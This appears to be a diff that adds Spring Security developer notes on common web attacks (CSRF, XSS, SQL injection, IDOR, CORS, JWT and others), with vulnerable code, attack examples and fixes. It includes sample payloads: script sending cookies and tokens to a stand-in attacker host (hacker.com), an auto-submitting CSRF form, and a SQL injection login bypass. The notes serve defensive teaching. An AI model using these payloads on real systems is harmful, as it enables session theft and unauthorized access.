@@ -1,1 +1,777 @@
+Below are **improved developer notes** for security attacks with **code examples, how the attack happens, and practical prevention** using **Spring Security**.
 
+---
+
+# 1. What are Security Attacks?
+
+Security attacks are **malicious attempts to access, manipulate, or destroy application data without authorization**.
+
+Attackers usually try to:
+
+* steal user data
+* impersonate users
+* run malicious scripts
+* bypass authentication
+* access protected resources
+
+Most common vulnerabilities are documented by **OWASP**.
+
+---
+
+# 2. Major Security Attacks in Web Applications
+
+Important attacks every backend developer must know:
+
+1. CSRF (Cross-Site Request Forgery)
+2. XSS (Cross-Site Scripting)
+3. SQL Injection
+4. Authentication / Credential Attacks
+5. Session Hijacking
+6. Clickjacking
+7. Broken Access Control
+8. Brute Force Attack
+9. Man-in-the-Middle Attack
+
+---
+
+# 3. CSRF (Cross-Site Request Forgery)
+
+## Definition
+
+CSRF occurs when an attacker tricks a **logged-in user** into sending an unwanted request to a website.
+
+Example actions:
+
+* transferring money
+* changing password
+* updating profile
+
+---
+
+# How CSRF Attack Happens
+
+Step 1
+User logs into bank website.
+
+```
+Set-Cookie: JSESSIONID=abc123
+```
+
+Step 2
+User visits malicious website.
+
+Step 3
+Malicious site sends request to bank.
+
+Browser automatically attaches cookie.
+
+```
+POST /transfer
+Cookie: JSESSIONID=abc123
+```
+
+Server thinks request is from real user.
+
+---
+
+# Vulnerable Spring Controller
+
+```java
+@PostMapping("/transfer")
+public String transferMoney(@RequestParam int amount,
+                            @RequestParam String account)
+{
+    bankService.transfer(amount, account);
+    return "Money transferred";
+}
+```
+
+---
+
+# Malicious HTML Page
+
+```html
+<form action="https://bank.com/transfer" method="POST">
+<input type="hidden" name="amount" value="10000">
+<input type="hidden" name="account" value="hacker123">
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+```
+
+---
+
+# CSRF Prevention (Spring Security)
+
+Spring Security generates a **CSRF token**.
+
+### Form Example
+
+```html
+<form action="/transfer" method="POST">
+<input type="hidden" name="_csrf" value="token123">
+</form>
+```
+
+### Security Configuration
+
+```java
+@Bean
+SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
+    http
+        .csrf(Customizer.withDefaults());
+    return http.build();
+}
+```
+
+If token missing → **403 Forbidden**
+
+---
+
+# 4. XSS (Cross-Site Scripting)
+
+## Definition
+
+XSS happens when attackers inject **malicious JavaScript into webpages**.
+
+The script runs in other users' browsers.
+
+---
+
+# How XSS Happens
+
+User comment stored in database:
+
+```html
+<script>
+document.location="http://hacker.com/steal?cookie="+document.cookie
+</script>
+```
+
+When another user opens the page, the script executes.
+
+Attacker steals session cookie.
+
+---
+
+# Vulnerable Code
+
+```java
+@PostMapping("/comment")
+public void addComment(@RequestParam String comment) {
+    commentRepository.save(comment);
+}
+```
+
+Displayed directly in HTML:
+
+```html
+<p th:text="${comment}"></p>
+```
+
+---
+
+# XSS Prevention
+
+### Escape HTML
+
+```java
+import org.springframework.web.util.HtmlUtils;
+
+String safeComment = HtmlUtils.htmlEscape(comment);
+```
+
+---
+
+### Content Security Policy
+
+```
+Content-Security-Policy: script-src 'self'
+```
+
+---
+
+### Use Template Engines
+
+Frameworks like **Thymeleaf** automatically escape output.
+
+---
+
+# 5. SQL Injection
+
+## Definition
+
+SQL Injection occurs when attackers inject SQL queries through input fields.
+
+---
+
+# How Attack Happens
+
+Vulnerable login code:
+
+```java
+String query = "SELECT * FROM users WHERE username='"
++ username + "' AND password='" + password + "'";
+```
+
+---
+
+Attacker enters:
+
+```
+username: admin
+password: ' OR '1'='1
+```
+
+Query becomes:
+
+```
+SELECT * FROM users
+WHERE username='admin'
+AND password='' OR '1'='1'
+```
+
+Login succeeds.
+
+---
+
+# SQL Injection Prevention
+
+### Use Prepared Statements
+
+```java
+PreparedStatement ps = connection.prepareStatement(
+"SELECT * FROM users WHERE username=? AND password=?");
+
+ps.setString(1, username);
+ps.setString(2, password);
+```
+
+---
+
+### Using Spring Data JPA
+
+```java
+User findByUsername(String username);
+```
+
+ORM frameworks like Hibernate automatically prevent SQL injection.
+
+---
+
+# 6. Session Hijacking
+
+## Definition
+
+Session Hijacking happens when attackers steal **session cookies**.
+
+---
+
+# How Attack Happens
+
+Server sends session cookie:
+
+```
+Set-Cookie: JSESSIONID=xyz123
+```
+
+Attacker steals cookie using:
+
+* XSS
+* network sniffing
+* malware
+
+Attacker sends request:
+
+```
+Cookie: JSESSIONID=xyz123
+```
+
+Server treats attacker as real user.
+
+---
+
+# Prevention
+
+### Use Secure Cookies
+
+```
+Set-Cookie: JSESSIONID=xyz123;
+Secure;
+HttpOnly;
+SameSite=Strict
+```
+
+---
+
+### Spring Boot Configuration
+
+```
+server.servlet.session.cookie.http-only=true
+server.servlet.session.cookie.secure=true
+```
+
+---
+
+# 7. Clickjacking
+
+## Definition
+
+Clickjacking tricks users into clicking something different than they see.
+
+Example:
+
+A hidden iframe loads bank site.
+
+User clicks:
+
+```
+Like Button
+```
+
+But actually clicks:
+
+```
+Transfer Money
+```
+
+---
+
+# Prevention
+
+### Use Security Headers
+
+```
+X-Frame-Options: DENY
+```
+
+---
+
+### Spring Security Configuration
+
+```java
+http
+.headers(headers ->
+headers.frameOptions(frame -> frame.deny()));
+```
+
+---
+
+# 8. Brute Force Attack
+
+## Definition
+
+Attacker repeatedly tries many passwords.
+
+Example:
+
+```
+admin123
+admin124
+admin125
+```
+
+until correct password found.
+
+---
+
+# Prevention
+
+### Account Lock
+
+```java
+if(failedAttempts > 5){
+    account.lock();
+}
+```
+
+---
+
+### Rate Limiting
+
+Example using filter:
+
+```java
+if(requestCount > LIMIT){
+    throw new RuntimeException("Too many requests");
+}
+```
+
+---
+
+### Enable 2FA
+
+Example:
+
+```
+Password + OTP
+```
+
+---
+
+# 9. Man-in-the-Middle Attack (MITM)
+
+## Definition
+
+Attacker intercepts communication between user and server.
+
+```
+User → Hacker → Server
+```
+
+Attacker can see:
+
+* passwords
+* session cookies
+* card details
+
+---
+
+# Prevention
+
+### Use HTTPS
+
+HTTPS encrypts communication using TLS.
+
+Example redirect:
+
+```java
+http.requiresChannel(channel ->
+channel.anyRequest().requiresSecure());
+```
+
+---
+
+# 10. Broken Access Control
+
+## Definition
+
+Users access resources they are not allowed to access.
+
+Example:
+
+Normal user tries:
+
+```
+/admin/users
+```
+
+---
+
+# Vulnerable Controller
+
+```java
+@GetMapping("/admin/users")
+public List<User> getUsers(){
+    return userRepository.findAll();
+}
+```
+
+Any user can access.
+
+---
+
+# Prevention
+
+### Role-Based Authorization
+
+```java
+@PreAuthorize("hasRole('ADMIN')")
+@GetMapping("/admin/users")
+public List<User> getUsers(){
+    return userRepository.findAll();
+}
+```
+---
+
+# 12. IDOR (Insecure Direct Object Reference)
+
+## Definition
+
+IDOR happens when a user can **access or modify another user's data by changing an ID in the URL or request**.
+
+The server **does not verify ownership of the resource**.
+
+---
+
+# How IDOR Happens
+
+Example API:
+
+```id="6bn0l0"
+GET /api/users/101
+```
+
+Server returns:
+
+```json id="rfpiql"
+{
+ "id":101,
+ "name":"Rahul",
+ "email":"rahul@gmail.com"
+}
+```
+
+Now attacker changes URL:
+
+```id="qsppg5"
+GET /api/users/102
+```
+
+Server returns another user's data.
+
+This means **any user can access other users' data**.
+
+---
+
+# Vulnerable Controller
+
+```java id="m1mbbd"
+@GetMapping("/users/{id}")
+public User getUser(@PathVariable Long id){
+    return userRepository.findById(id).get();
+}
+```
+
+Problem:
+
+Server **does not check if logged-in user owns this resource**.
+
+---
+
+# Practical Prevention
+
+Always verify **logged-in user owns the resource**.
+
+```java id="u2hlqz"
+@GetMapping("/users/{id}")
+public User getUser(@PathVariable Long id,
+                    Authentication authentication){
+
+    User user = userRepository.findById(id).get();
+
+    if(!user.getUsername().equals(authentication.getName())){
+        throw new RuntimeException("Access Denied");
+    }
+
+    return user;
+}
+```
+
+---
+
+Better solution using Spring Security:
+
+```java id="5x84n4"
+@PreAuthorize("#id == authentication.principal.id")
+@GetMapping("/users/{id}")
+public User getUser(@PathVariable Long id){
+    return userRepository.findById(id).get();
+}
+```
+
+---
+
+# Real Example
+
+Many large apps like **Instagram** or **Paytm** could leak private data if IDOR exists.
+
+Example:
+
+```id="hb7k23"
+/api/orders/9001
+/api/orders/9002
+/api/orders/9003
+```
+
+---
+
+# 13. CORS Misconfiguration
+
+## Definition
+
+CORS (Cross-Origin Resource Sharing) controls **which websites can access your API**.
+
+Misconfigured CORS allows **any malicious website to access your backend API**.
+
+---
+
+# Example Attack
+
+User logs into:
+
+```id="f4frqo"
+bank.com
+```
+
+Session cookie exists.
+
+Attacker website:
+
+```id="exbr0o"
+evil.com
+```
+
+Sends request:
+
+```javascript id="16y07m"
+fetch("https://bank.com/api/balance")
+.then(res => res.json())
+.then(data => console.log(data))
+```
+
+If CORS allows all origins:
+
+```id="z9g0i5"
+Access-Control-Allow-Origin: *
+```
+
+Then attacker website can read sensitive data.
+
+---
+
+# Vulnerable Spring Configuration
+
+```java id="zv6ejf"
+@CrossOrigin(origins = "*")
+@RestController
+public class AccountController {
+}
+```
+
+---
+
+# Proper CORS Configuration
+
+Allow only trusted domains.
+
+```java id="hl3qhy"
+@Bean
+public WebMvcConfigurer corsConfigurer(){
+    return new WebMvcConfigurer(){
+        @Override
+        public void addCorsMappings(CorsRegistry registry){
+            registry.addMapping("/api/**")
+            .allowedOrigins("https://myfrontend.com")
+            .allowedMethods("GET","POST","PUT","DELETE");
+        }
+    };
+}
+```
+
+---
+
+# 14. JWT Attacks
+
+JWT is commonly used for authentication in APIs.
+
+Example token:
+
+```id="v0h9qb"
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+```
+
+---
+
+# 1. Token Theft
+
+If token stored in **localStorage**, XSS can steal it.
+
+Example malicious script:
+
+```javascript id="qt03tl"
+fetch("http://hacker.com?token="+localStorage.getItem("token"))
+```
+
+---
+
+# Prevention
+
+Store tokens in **HttpOnly cookies**.
+
+Example:
+
+```id="0ddjjh"
+Set-Cookie: accessToken=abc123;
+HttpOnly;
+Secure;
+SameSite=Strict
+```
+
+---
+
+# 2. Weak JWT Secret
+
+Bad example:
+
+```id="64d9mf"
+jwt.secret=12345
+```
+
+Attacker can guess the secret and create fake tokens.
+
+---
+
+# Secure Secret Example
+
+```id="og3f61"
+jwt.secret=Jd92jD!@#ksl0923KJdslk2309dj
+```
+
+---
+
+# 3. Missing Token Expiration
+
+Bad JWT:
+
+```json id="ep5ykc"
+{
+ "user":"admin"
+}
+```
+
+Token never expires.
+
+---
+
+Good JWT:
+
+```json id="pjg5le"
+{
+ "user":"admin",
+ "exp":1712345678
+}
+```
+
+---
+
+# Spring Boot JWT Validation Example
+
+```java id="d0l3ea"
+if(jwtTokenProvider.validateToken(token)){
+    Authentication auth =
+    jwtTokenProvider.getAuthentication(token);
+}
+```
+
+---
+
+# Final Security Attacks List (Important for Backend Developers)
+
+| Attack                | Description                       |
+| --------------------- | --------------------------------- |
+| CSRF                  | Fake request using user cookies   |
+| XSS                   | Inject malicious JS               |
+| SQL Injection         | Inject SQL queries                |
+| Session Hijacking     | Steal session cookies             |
+| Clickjacking          | Trick user clicks                 |
+| Brute Force           | Password guessing                 |
+| MITM                  | Intercept network traffic         |
+| Broken Access Control | Access restricted endpoints       |
+| IDOR                  | Access other user's data          |
+| CORS Misconfiguration | Malicious websites accessing APIs |
+| JWT Attacks           | Token theft or forgery            |
+
+---
